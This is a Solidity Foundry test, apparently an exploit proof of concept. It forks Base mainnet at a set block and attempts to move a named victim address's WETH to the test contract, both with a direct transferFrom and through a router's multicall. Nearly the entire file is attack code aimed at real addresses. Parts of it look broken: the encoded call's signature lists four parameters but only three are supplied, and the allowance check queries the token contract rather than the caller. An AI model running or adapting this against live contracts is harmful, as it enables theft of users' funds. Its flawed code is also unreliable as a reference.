// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface Irouter {
    function multicall(bytes calldata) external;
}



contract exploitTest is Test {
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    address private vic = 0x5C629f8C0B5368F523C85bFe79d2A8EFB64fB0c8;
    Irouter swaprout = Irouter(0x2626664c2603336E57B271c5C0b26F421741e481);

    function setUp() public {
        vm.createSelectFork("https://developer-access-mainnet.base.org", 20295659);
        // deal(address(weth), address(this), 20 ether);
    }

    function testExploit() external {
        uint256 allowance = weth.allowance(vic, address(weth));
        uint256 balance = weth.balanceOf(vic);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;

        bytes memory transdata = abi.encodeWithSignature(
            "transferFrom(address,address,address,uint256)",  
            vic, 
            address(this), 
            weth.balanceOf(vic)
        );

        weth.transferFrom(vic, address(this), amuntToDrain);

        Irouter(swaprout).multicall(transdata);
    }
}
